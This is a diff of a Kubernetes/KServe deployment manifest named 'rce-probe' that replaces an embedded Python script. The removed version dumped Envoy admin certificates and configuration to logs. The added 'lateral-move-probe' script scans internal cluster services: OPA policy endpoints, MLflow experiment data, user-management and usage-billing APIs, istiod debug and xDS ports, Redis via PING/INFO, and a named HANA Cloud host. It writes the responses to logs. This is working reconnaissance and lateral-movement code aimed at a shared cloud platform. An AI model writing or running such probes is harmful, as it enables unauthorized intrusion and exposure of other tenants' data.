@@ -4,11 +4,11 @@ metadata:
   name: rce-probe
   labels:
     scenarios.ai.sap.com/id: "rce-probe"
-    ai.sap.com/version: "4.5.0"
+    ai.sap.com/version: "4.6.0"
   annotations:
     scenarios.ai.sap.com/name: "rce-probe"
     executables.ai.sap.com/name: "rce-probe"
-    executables.ai.sap.com/description: "envoy-compact-clusters-config-dump"
+    executables.ai.sap.com/description: "lateral-move-probe-opa-mltrack-usermgmt-redis-istiod"
 spec:
   template:
     apiVersion: "serving.kserve.io/v1beta1"
@@ -28,66 +28,131 @@ spec:
           args:
           - |
             python3 -c "
-            import socket
+            import socket, http.client, urllib.request, urllib.error, ssl, os
 
-            print('[PROBE_V45_START]', flush=True)
+            print('[PROBE_V46_START]', flush=True)
 
-            def envoy_admin(path, timeout=20):
+            def tcp_probe(host, port, timeout=8):
                 try:
                     s = socket.socket()
                     s.settimeout(timeout)
-                    s.connect(('127.0.0.1', 15000))
-                    req = (
-                        f'GET {path} HTTP/1.1\r\n'
-                        'Host: 127.0.0.1\r\n'
-                        'Connection: Upgrade, HTTP2-Settings\r\n'
-                        'Upgrade: h2c\r\n'
-                        'HTTP2-Settings: AAMAAABkAAQAAP__\r\n'
-                        'Connection: close\r\n\r\n'
-                    )
-                    s.sendall(req.encode())
-                    chunks = []
-                    while True:
-                        c = s.recv(65536)
-                        if not c: break
-                        chunks.append(c)
+                    s.connect((host, port))
+                    s.send(b'GET / HTTP/1.0\r\nHost: ' + host.encode() + b'\r\n\r\n')
+                    import select
+                    r, _, _ = select.select([s], [], [], 4)
+                    data = s.recv(4096) if r else b'(no response)'
                     s.close()
-                    return b''.join(chunks).decode(errors='replace')
+                    return data.decode(errors='replace')[:800]
                 except Exception as e:
                     return f'ERR:{e}'
 
-            def emit(label, data, chunk=90000):
-                # Collapse newlines so each chunk is ONE log line
-                flat = data.replace('\r\n', '\n').replace('\r', '\n')
-                flat = flat.replace('\n', '|')
-                total = len(flat)
-                for i in range(0, max(1, total), chunk):
-                    seg = flat[i:i+chunk]
-                    print(f'[{label}_{i}/{total}] {seg}', flush=True)
+            def http_get(host, port, path='/', headers=None, timeout=10):
+                try:
+                    conn = http.client.HTTPConnection(host, port, timeout=timeout)
+                    hdrs = {'Host': host, 'Accept': '*/*', 'Connection': 'close'}
+                    if headers:
+                        hdrs.update(headers)
+                    conn.request('GET', path, headers=hdrs)
+                    r = conn.getresponse()
+                    body = r.read(4096).decode(errors='replace')
+                    return f'HTTP {r.status} {r.reason}\n{dict(r.getheaders())}\n{body}'
+                except Exception as e:
+                    return f'ERR:{e}'
 
-            # 1. /certs
-            emit('CERTS', envoy_admin('/certs'))
+            # Target service endpoints
+            TARGETS = [
+                # nginx-opa in istio-system - OPA authorization policies
+                ('nginx-opa.istio-system.svc.cluster.local', 8080, [
+                    '/', '/v1/data', '/v1/policies', '/v1/data/istio/authz',
+                    '/health', '/metrics'
+                ]),
+                # ml-tracking - ML run metadata
+                ('ml-tracking-service.ml-tracking.svc.cluster.local', 80, [
+                    '/', '/api/v1/', '/mlflow/api/2.0/mlflow/experiments/list',
+                    '/mlflow/api/2.0/mlflow/runs/search', '/api/2.0/preview/runs/get-artifact',
+                    '/health', '/actuator/health'
+                ]),
+                # user-management via OPA
+                ('user-management-nginx-opa-service.user-management.svc.cluster.local', 8080, [
+                    '/', '/v1/data', '/v1/policies', '/health'
+                ]),
+                # istiod debug endpoints (port 15010 = plaintext xDS, 15014 = debug)
+                ('istiod.istio-system.svc.cluster.local', 15014, [
+                    '/debug/configz', '/debug/endpointz', '/debug/instancez',
+                    '/debug/authorizationz', '/metrics'
+                ]),
+                # usage-api - billing/quota data
+                ('usage-api-service.usage-api.svc.cluster.local', 5000, [
+                    '/', '/health', '/api/v1/usages', '/v1/usages'
+                ]),
+                # user-management
+                ('user-management-api-service.user-management.svc.cluster.local', 5000, [
+                    '/', '/health', '/api/v1/', '/v1/users', '/users'
+                ]),
+                # internal-domain-gateway
+                ('internal-domain-gateway.istio-system.svc.cluster.local', 8080, [
+                    '/', '/health'
+                ]),
+            ]
 
-            # 2. /clusters
-            emit('CLUSTERS', envoy_admin('/clusters'))
+            for host, port, paths in TARGETS:
+                print(f'\\n[TARGET] {host}:{port}', flush=True)
+                # Quick TCP check first
+                tcp = tcp_probe(host, port, timeout=5)
+                print(f'  [TCP] {tcp[:300]}', flush=True)
+                # If TCP connected (not ERR:), try HTTP paths
+                if not tcp.startswith('ERR:'):
+                    for path in paths:
+                        resp = http_get(host, port, path, timeout=8)
+                        print(f'  [HTTP {path}] {resp[:500]}', flush=True)
 
-            # 3. /listeners
-            emit('LISTENERS', envoy_admin('/listeners'))
+            # Redis probe
+            print('\\n[TARGET] redis.user-management.svc.cluster.local:6379', flush=True)
+            try:
+                s = socket.socket()
+                s.settimeout(8)
+                s.connect(('redis.user-management.svc.cluster.local', 6379))
+                # Send PING
+                s.sendall(b'*1\r\n\$4\r\nPING\r\n')
+                import time
+                time.sleep(1)
+                data = b''
+                try:
+                    data = s.recv(4096)
+                except: pass
+                print(f'  [REDIS PING] {data.decode(errors=\"replace\")[:200]}', flush=True)
+                # Try INFO
+                s.sendall(b'*1\r\n\$4\r\nINFO\r\n')
+                time.sleep(1)
+                try: data = s.recv(8192)
+                except: data = b''
+                print(f'  [REDIS INFO] {data.decode(errors=\"replace\")[:500]}', flush=True)
+                s.close()
+            except Exception as e:
+                print(f'  [REDIS] ERR:{e}', flush=True)
 
-            # 4. /config_dump (full, chunked at 90KB)
-            emit('CFGDUMP', envoy_admin('/config_dump', timeout=30))
+            # istiod port 15010 (plaintext xDS/gRPC) - gRPC CONNECT probe
+            print('\\n[TARGET] istiod:15010 grpc', flush=True)
+            try:
+                s = socket.socket()
+                s.settimeout(8)
+                s.connect(('istiod.istio-system.svc.cluster.local', 15010))
+                # Send HTTP/2 client preface
+                s.sendall(b'PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n')
+                import select
+                r, _, _ = select.select([s], [], [], 4)
+                data = s.recv(4096) if r else b'(no response)'
+                s.close()
+                print(f'  [H2 PREFACE] {data[:200]}', flush=True)
+            except Exception as e:
+                print(f'  ERR:{e}', flush=True)
 
-            # 5. /stats filtered
-            resp = envoy_admin('/stats')
-            lines = [l for l in resp.split('\n')
-                     if any(k in l for k in ['upstream_cx', 'upstream_rq',
-                                              'ssl.handshake', 'ssl.fail',
-                                              'ssl.connection_error',
-                                              'cluster_manager',
-                                              'server.'])]
-            emit('STATS', '\n'.join(lines[:300]))
+            # Also probe the HANA Cloud DB endpoint - just TCP connect
+            print('\\n[TARGET] hana-cloud:443 tcp', flush=True)
+            hana = tcp_probe('8ab6c8b4-9bea-46de-909e-0ef8e2e44124.hna1.prod-eu10.hanacloud.ondemand.com', 443, timeout=10)
+            print(f'  [TCP] {hana[:300]}', flush=True)
 
-            print('[PROBE_V45_DONE]', flush=True)
+            print('[PROBE_V46_DONE]', flush=True)
             " 2>&1
             python3 -c "
             import http.server
